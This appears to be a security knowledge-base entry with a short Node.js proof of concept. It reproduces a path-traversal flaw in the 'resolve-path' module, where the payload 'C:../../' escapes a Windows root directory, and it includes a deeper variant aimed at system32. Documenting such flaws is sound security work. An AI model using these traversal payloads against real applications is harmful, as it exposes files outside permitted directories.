---
id: 123e4567-e89b-12d3-a456-426614174003
name: node-execute-resolve-path-call
type: command
executor: node
data: >-
  const resolvePath = require('resolve-path'); const root = 'C:/windows/temp/';
  const relPath = 'C:../../'; const result = resolvePath(root, relPath);
  console.log('Resolved Path:', result);
output: 'Resolved Path: C:/'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:16.847Z'
platforms:
  - Windows
  - Node.js
tags:
  - path-traversal
  - exploit
verified: false
validated: true
submitted: true
---

# node-execute-resolve-path-call

## Command

```javascript
const resolvePath = require('resolve-path');
const root = 'C:/windows/temp/';
const relPath = 'C:../../';
const result = resolvePath(root, relPath);
console.log('Resolved Path:', result);
```

## Description

This JavaScript command loads the resolve-path module and calls it with a root path and a traversal payload using Windows drive notation, demonstrating the vulnerability by resolving to a path outside the root.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| root | Base directory to resolve against (e.g., 'C:/windows/temp/') | Yes |
| relPath | Relative path with traversal (e.g., 'C:../../') | Yes |

## Examples

### Basic Usage

Save as exploit.js and run `node exploit.js`.

### Advanced Usage

Modify relPath for deeper traversal, e.g., 'C:../../../system32/'.

```javascript
const result = resolvePath('C:/app/', 'C:../../../');
```

## Expected Output

Resolved Path: C:/ (or similar, escaping the root and potentially reaching sensitive areas like system files).

## Related

- [[procedures/Reproduce-Path-Traversal-in-Resolve-Path]]
